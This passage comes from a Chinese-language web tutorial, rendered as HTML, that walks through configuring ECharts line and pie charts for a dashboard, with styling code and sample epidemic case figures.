class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//折线图模块</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> myChart = echarts.init(<span class="built_in">document</span>.querySelector(<span class="string">'.line .chart'</span>))</span><br><span class="line">    <span class="keyword">var</span> option = &#123;</span><br><span class="line">        color: [<span class="string">"#00f2f1"</span>, <span class="string">"#ed3f35"</span>],</span><br><span class="line">        tooltip: &#123;</span><br><span class="line">            trigger: <span class="string">'axis'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//图例模块</span></span><br><span class="line">        legend: &#123;</span><br><span class="line">            <span class="comment">// 距离容器10%</span></span><br><span class="line">            right: <span class="string">"10%"</span>,</span><br><span class="line">            <span class="comment">// 修饰图例文字的颜色</span></span><br><span class="line">            textStyle: &#123;</span><br><span class="line">                color: <span class="string">"#4c9bfd"</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果series 里面设置了name，此时图例组件的data可以省略</span></span><br><span class="line">            <span class="comment">// data: ["邮件营销", "联盟广告"]</span></span><br><span class="line">        &#125;,</span><br><span class="line">        grid: &#123;</span><br><span class="line">            top: <span class="string">"20%"</span>,</span><br><span class="line">            left: <span class="string">"3%"</span>,</span><br><span class="line">            right: <span class="string">"4%"</span>,</span><br><span class="line">            bottom: <span class="string">"3%"</span>,</span><br><span class="line">            show: <span class="literal">true</span>,</span><br><span class="line">            borderColor: <span class="string">"#012f4a"</span>,</span><br><span class="line">            containLabel: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        xAxis: &#123;</span><br><span class="line">            type: <span class="string">'category'</span>,</span><br><span class="line">            boundaryGap: <span class="literal">false</span>,</span><br><span class="line">            data: [<span class="string">'周一'</span>, <span class="string">'周二'</span>, <span class="string">'周三'</span>, <span class="string">'周四'</span>, <span class="string">'周五'</span>, <span class="string">'周六'</span>, <span class="string">'周日'</span>],</span><br><span class="line">            <span class="comment">//去除刻度</span></span><br><span class="line">            axisTick: &#123;</span><br><span class="line">                show: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//修改刻度标签颜色</span></span><br><span class="line">            axisLabel: &#123;</span><br><span class="line">                color: <span class="string">"white"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//去除x坐标轴</span></span><br><span class="line">            axisLine: &#123;</span><br><span class="line">                show: <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        yAxis: &#123;</span><br><span class="line">            type: <span class="string">'value'</span>,</span><br><span class="line">            <span class="comment">//去除y轴刻度</span></span><br><span class="line">            axisTick: &#123;</span><br><span class="line">                show: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//修改刻度标签颜色</span></span><br><span class="line">            axisLabel: &#123;</span><br><span class="line">                color: <span class="string">"white"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//修改y轴分割线颜色</span></span><br><span class="line">            splitLine: &#123;</span><br><span class="line">                lineStyle:&#123;</span><br><span class="line">                    color: <span class="string">"#012f4a"</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        series: [&#123;</span><br><span class="line">                name: <span class="string">'现存确诊'</span>,</span><br><span class="line">                type: <span class="string">'line'</span>,</span><br><span class="line">                stack: <span class="string">'总量'</span>,</span><br><span class="line">                data: [<span class="number">120</span>, <span class="number">132</span>, <span class="number">101</span>, <span class="number">134</span>, <span class="number">90</span>, <span class="number">230</span>, <span class="number">210</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                name: <span class="string">'累计确诊'</span>,</span><br><span class="line">                type: <span class="string">'line'</span>,</span><br><span class="line">                stack: <span class="string">'总量'</span>,</span><br><span class="line">                data: [<span class="number">220</span>, <span class="number">182</span>, <span class="number">191</span>, <span class="number">234</span>, <span class="number">290</span>, <span class="number">330</span>, <span class="number">310</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">        ]</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 把配置和数据给实例对象</span></span><br><span class="line">    myChart.setOption(option);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        myChart.resize()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h2 id="折线图2模块"><a href="#折线图2模块" class="headerlink" title="折线图2模块"></a>折线图2模块</h2><ol><li>引入类似的官方示例</li><li>进行样式定制</li></ol><p>更换图例组件文字颜色 rgba(255,255,255,.5)  文字大小为12</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">legend: &#123;</span><br><span class="line">    top: <span class="string">"0%"</span>,</span><br><span class="line">    <span class="comment">//图例字体样式</span></span><br><span class="line">    textStyle: &#123;</span><br><span class="line">        color: <span class="string">"rgba(255,255,255,.5)"</span>,</span><br><span class="line">        fontSize: <span class="string">"12"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p> 修改图表大小</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grid: &#123;</span><br><span class="line">      left: <span class="string">"10"</span>,</span><br><span class="line">      top: <span class="string">"30"</span>,</span><br><span class="line">      right: <span class="string">"10"</span>,</span><br><span class="line">      bottom: <span class="string">"10"</span>,</span><br><span class="line">      containLabel: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p> 修改x轴相关配置</p><ul><li>修改文本颜色为rgba(255,255,255,.6)  文字大小为 12</li><li>x轴线的颜色为   rgba(255,255,255,.2)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文本颜色为rgba(255,255,255,.6)  文字大小为 12</span></span><br><span class="line">axisLabel: &#123;</span><br><span class="line">     textStyle: &#123;</span><br><span class="line">       color: <span class="string">"rgba(255,255,255,.6)"</span>,</span><br><span class="line">       fontSize: <span class="number">12</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">    <span class="comment">// x轴线的颜色为   rgba(255,255,255,.2)</span></span><br><span class="line">   axisLine: &#123;</span><br><span class="line">     lineStyle: &#123;</span><br><span class="line">       color: <span class="string">"rgba(255,255,255,.2)"</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>修改y轴的相关配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yAxis: [&#123;</span><br><span class="line">    type: <span class="string">'value'</span>,</span><br><span class="line">    <span class="comment">//隐藏坐标轴刻度</span></span><br><span class="line">    axisTick: &#123; <span class="attr">show</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">    <span class="comment">//标注y轴线样式</span></span><br><span class="line">    axisLine: &#123;</span><br><span class="line">        lineStyle: &#123;</span><br><span class="line">            color: <span class="string">"rgba(255,255,255,.1)"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//标注文本</span></span><br><span class="line">    axisLabel: &#123;</span><br><span class="line">        textStyle: &#123;</span><br><span class="line">            color: <span class="string">"rgba(255,255,255,.6)"</span>,</span><br><span class="line">            fontSize: <span class="number">12</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 修改分割线的颜色</span></span><br><span class="line">    splitLine: &#123;</span><br><span class="line">        lineStyle: &#123;</span><br><span class="line">            color: <span class="string">"rgba(255,255,255,.1)"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;],</span><br></pre></td></tr></table></figure><p>修改两个线模块配置(注意在series 里面定制)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">series: [&#123;</span><br><span class="line">               name: <span class="string">'新增确诊'</span>,</span><br><span class="line">               type: <span class="string">'line'</span>,</span><br><span class="line">               <span class="comment">// stack: '总量', //数据堆叠</span></span><br><span class="line">               data: [<span class="number">220</span>, <span class="number">182</span>, <span class="number">191</span>, <span class="number">234</span>, <span class="number">290</span>, <span class="number">330</span>, <span class="number">310</span>],</span><br><span class="line">               <span class="comment">//线圆滑</span></span><br><span class="line">               smooth: <span class="literal">true</span>,</span><br><span class="line">               <span class="comment">// 单独修改线的样式</span></span><br><span class="line">               lineStyle: &#123;</span><br><span class="line">                   color: <span class="string">"#0184d5"</span>,</span><br><span class="line">                   width: <span class="number">2</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="comment">// 填充区域</span></span><br><span class="line">               areaStyle: &#123;</span><br><span class="line">                   <span class="comment">// 渐变色</span></span><br><span class="line">                   color: <span class="keyword">new</span> echarts.graphic.LinearGradient(</span><br><span class="line">                       <span class="number">0</span>,</span><br><span class="line">                       <span class="number">0</span>,</span><br><span class="line">                       <span class="number">0</span>,</span><br><span class="line">                       <span class="number">1</span>,</span><br><span class="line">                       [&#123;</span><br><span class="line">                               offset: <span class="number">0</span>,</span><br><span class="line">                               color: <span class="string">"rgba(1, 132, 213, 0.4)"</span> <span class="comment">// 渐变色的起始颜色</span></span><br><span class="line">                           &#125;,</span><br><span class="line">                           &#123;</span><br><span class="line">                               offset: <span class="number">0.8</span>,</span><br><span class="line">                               color: <span class="string">"rgba(1, 132, 213, 0.1)"</span> <span class="comment">// 渐变线的结束颜色</span></span><br><span class="line">                           &#125;</span><br><span class="line">                       ],</span><br><span class="line">                       <span class="literal">false</span></span><br><span class="line">                   ),</span><br><span class="line">                   shadowColor: <span class="string">"rgba(0, 0, 0, 0.1)"</span> <span class="comment">//阴影颜色</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="comment">// 设置拐点 小圆点</span></span><br><span class="line">               symbol: <span class="string">"circle"</span>,</span><br><span class="line">               <span class="comment">// 拐点大小</span></span><br><span class="line">               symbolSize: <span class="number">8</span>,</span><br><span class="line">               <span class="comment">// 设置拐点颜色以及边框</span></span><br><span class="line">               itemStyle: &#123;</span><br><span class="line">                   color: <span class="string">"#0184d5"</span>,</span><br><span class="line">                   borderColor: <span class="string">"rgba(221, 220, 107, .1)"</span>,</span><br><span class="line">                   borderWidth: <span class="number">12</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="comment">//开始不显示坐标圆点</span></span><br><span class="line">               showSymbol: <span class="literal">false</span>,</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="comment">// 开始不显示拐点， 鼠标经过显示</span></span><br><span class="line">               showSymbol: <span class="literal">false</span>,</span><br><span class="line">               name: <span class="string">"新增死亡"</span>,</span><br><span class="line">               type: <span class="string">"line"</span>,</span><br><span class="line">               smooth: <span class="literal">true</span>,</span><br><span class="line">               lineStyle: &#123;</span><br><span class="line">                   normal: &#123;</span><br><span class="line">                       color: <span class="string">"#00d887"</span>,</span><br><span class="line">                       width: <span class="number">2</span></span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;,</span><br><span class="line">               areaStyle: &#123;</span><br><span class="line">                   normal: &#123;</span><br><span class="line">                       color: <span class="keyword">new</span> echarts.graphic.LinearGradient(</span><br><span class="line">                           <span class="number">0</span>,</span><br><span class="line">                           <span class="number">0</span>,</span><br><span class="line">                           <span class="number">0</span>,</span><br><span class="line">                           <span class="number">1</span>,</span><br><span class="line">                           [&#123;</span><br><span class="line">                                   offset: <span class="number">0</span>,</span><br><span class="line">                                   color: <span class="string">"rgba(0, 216, 135, 0.4)"</span></span><br><span class="line">                               &#125;,</span><br><span class="line">                               &#123;</span><br><span class="line">                                   offset: <span class="number">0.8</span>,</span><br><span class="line">                                   color: <span class="string">"rgba(0, 216, 135, 0.1)"</span></span><br><span class="line">                               &#125;</span><br><span class="line">                           ],</span><br><span class="line">                           <span class="literal">false</span></span><br><span class="line">                       ),</span><br><span class="line">                       shadowColor: <span class="string">"rgba(0, 0, 0, 0.1)"</span></span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="comment">// 设置拐点 小圆点</span></span><br><span class="line">               symbol: <span class="string">"circle"</span>,</span><br><span class="line">               <span class="comment">// 拐点大小</span></span><br><span class="line">               symbolSize: <span class="number">5</span>,</span><br><span class="line">               <span class="comment">// 设置拐点颜色以及边框</span></span><br><span class="line">               itemStyle: &#123;</span><br><span class="line">                   color: <span class="string">"#00d887"</span>,</span><br><span class="line">                   borderColor: <span class="string">"rgba(221, 220, 107, .1)"</span>,</span><br><span class="line">                   borderWidth: <span class="number">12</span></span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="comment">// 开始不显示拐点， 鼠标经过显示</span></span><br><span class="line">               showSymbol: <span class="literal">false</span>,</span><br><span class="line">               data: [<span class="number">120</span>, <span class="number">132</span>, <span class="number">101</span>, <span class="number">134</span>, <span class="number">90</span>, <span class="number">230</span>, <span class="number">210</span>],</span><br><span class="line">               <span class="comment">// stack: '总量',</span></span><br><span class="line">           &#125;</span><br><span class="line">       ]</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>更换数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没有</span><br></pre></td></tr></table></figure><h2 id="饼形图1模块"><a href="#饼形图1模块" class="headerlink" title="饼形图1模块"></a>饼形图1模块</h2><ul><li>官网找到类似实例， 适当分析，并且引入到HTML页面中</li><li>根据需求定制图表</li></ul><p>定制图表需求1： </p><ul><li>修改图例组件在底部并且居中显示。 </li><li>每个小图标的宽度和高度修改为 10px   </li><li>文字大小为12 颜色  rgba(255,255,255,.5)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">legend: &#123;</span><br><span class="line">    <span class="comment">// 距离底部为0%</span></span><br><span class="line">    bottom: <span class="string">"0%"</span>,</span><br><span class="line">    <span class="comment">// 小图标的宽度和高度</span></span><br><span class="line">    itemWidth: <span class="number">10</span>,</span><br><span class="line">    itemHeight: <span class="number">10</span>,</span><br><span class="line">    <span class="comment">// 修改图例组件的文字为 12px</span></span><br><span class="line">    textStyle: &#123;</span><br><span class="line">        color: <span class="string">"rgba(255,255,255,.5)"</span>,</span><br><span class="line">        fontSize: <span class="string">"12"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>定制需求2：</p><ul><li>修改水平居中 垂直居中</li><li>修改内圆半径和外圆半径为    [“40%”, “60%”]   pink老师友情提示，带有直角坐标系的比如折线图柱状图是 grid修改图形大小，而我们饼形图是通过 radius 修改大小</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">series: [&#123;</span><br><span class="line">    name: <span class="string">'确诊病例'</span>,</span><br><span class="line">    type: <span class="string">'pie'</span>,</span><br><span class="line">    <span class="comment">//设置饼状图在容器中的位置，这里和带有坐标系的图不一样</span></span><br><span class="line">    center: [<span class="string">"50%"</span>, <span class="string">"50%"</span>],</span><br><span class="line">    <span class="comment">//  修改内圆半径和外圆半径为  百分比是相对于容器宽度来说的</span></span><br><span class="line">    radius: [<span class="string">"40%"</span>, <span class="string">"60%"</span>],</span><br><span class="line">    avoidLabelOverlap: <span class="literal">false</span>,</span><br><span class="line">    label: &#123;</span><br><span class="line">        show: <span class="literal">false</span>,</span><br><span class="line">        position: <span class="string">'center'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    emphasis: &#123;</span><br><span class="line">        label: &#123;</span><br><span class="line">            <span class="comment">// show: true,</span></span><br><span class="line">            fontSize: <span class="string">'30'</span>,</span><br><span class="line">            fontWeight: <span class="string">'bold'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//不显示连接线</span></span><br><span class="line">    labelLine: &#123;</span><br><span class="line">        show: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data: [</span><br><span class="line">        &#123; <span class="attr">value</span>: <span class="number">335</span>, <span class="attr">name</span>: <span class="string">'广东'</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">value</span>: <span class="number">310</span>, <span class="attr">name</span>: <span class="string">'武汉'</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">value</span>: <span class="number">234</span>, <span class="attr">name</span>: <span class="string">'北京'</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">value</span>: <span class="number">135</span>, <span class="attr">name</span>: <span class="string">'浙江'</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">value</span>: <span class="number">1548</span>, <span class="attr">name</span>: <span class="string">'江苏'</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><p>更换颜色</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">color: [</span><br><span class="line">    <span class="string">"#065aab"</span>,</span><br><span class="line">    <span class="string">"#066eab"</span>,</span><br><span class="line">    <span class="string">"#0682ab"</span>,</span><br><span class="line">    <span class="string">"#0696ab"</span>,</span><br><span class="line">    <span class="string">"#06a0ab"</span>,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> myChart = echarts.init(<span class="built_in">document</span>.querySelector(<span class="string">".pie .chart"</span>));</span><br><span class="line">    <span class="keyword">var</span> option = &#123;</span><br><span class="line">        color: [</span><br><span class="line">            <span class="string">"#065aab"</span>,</span><br><span class="line">            <span class="string">"#066eab"</span>,</span><br><span class="line">            <span class="string">"#0682ab"</span>,</span><br><span class="line">            <span class="string">"#0696ab"</span>,</span><br><span class="line">            <span class="string">"#06a0ab"</span>,</span><br><span class="line">        ],</span><br><span class="line">        tooltip: &#123;</span><br><span class="line">            trigger: <span class="string">'item'</span>,</span><br><span class="line">            formatter: <span class="string">'&#123;a&#125; &lt;br/&gt;&#123;b&#125;: &#123;c&#125; (&#123;d&#125;%)'</span></span><br><span class="line">        &#125;,</span><br><span class="line">        legend: &#123;</span><br><span class="line">            <span class="comment">// 距离底部为0%</span></span><br><span class="line">            bottom: <span class="string">"0%"</span>,</span><br><span class="line">            <span class="comment">// 小图标的宽度和高度</span></span><br><span class="line">            itemWidth: <span class="number">10</span>,</span><br><span class="line">            itemHeight: <span class="number">10</span>,</span><br><span class="line">            <span class="comment">// 修改图例组件的文字为 12px</span></span><br><span class="line">            textStyle: &#123;</span><br><span class="line">                color: <span class="string">"rgba(255,255,255,.5)"</span>,</span><br><span class="line">                fontSize: <span class="string">"12"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        series: [&#123;</span><br><span class="line">            name: <span class="string">'确诊病例'</span>,</span><br><span class="line">            type: <span class="string">'pie'</span>,</span><br><span class="line">            <span class="comment">//设置饼状图在容器中的位置，这里和带有坐标系的图不一样</span></span><br><span class="line">            center: [<span class="string">"50%"</span>, <span class="string">"50%"</span>],</span><br><span class="line">            <span class="comment">//  修改内圆半径和外圆半径为  百分比是相对于容器宽度来说的</span></span><br><span class="line">            radius: [<span class="string">"40%"</span>, <span class="string">"60%"</span>],</span><br><span class="line">            avoidLabelOverlap: <span class="literal">false</span>,</span><br><span class="line">            label: &#123;</span><br><span class="line">                show: <span class="literal">false</span>,</span><br><span class="line">                position: <span class="string">'center'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            emphasis: &#123;</span><br><span class="line">                label: &#123;</span><br><span class="line">                    <span class="comment">// show: true,</span></span><br><span class="line">                    fontSize: <span class="string">'30'</span>,</span><br><span class="line">                    fontWeight: <span class="string">'bold'</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//不显示连接线</span></span><br><span class="line">            labelLine: &#123;</span><br><span class="line">                show: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            data: [</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">335</span>, <span class="attr">name</span>: <span class="string">'广东'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">310</span>, <span class="attr">name</span>: <span class="string">'武汉'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">234</span>, <span class="attr">name</span>: <span class="string">'北京'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">135</span>, <span class="attr">name</span>: <span class="string">'浙江'</span> &#125;,</span><br><span class="line">                &#123; <span class="attr">value</span>: <span class="number">1548</span>, <span class="attr">name</span>: <span class="string">'江苏'</span> &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;;</span><br><span class="line">    myChart.setOption(option);</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        myChart.resize();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="饼形图（南丁格尔玫瑰图）"><a href="#饼形图（南丁格尔玫瑰图）" class="headerlink" title="饼形图（南丁格尔玫瑰图）"></a>饼形图（南丁格尔玫瑰图）</h2><ul><li>官网找到类似实例， 适当分析，并且引入到HTML页面中</li><li>根据需求定制图表</li></ul><p>完整代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 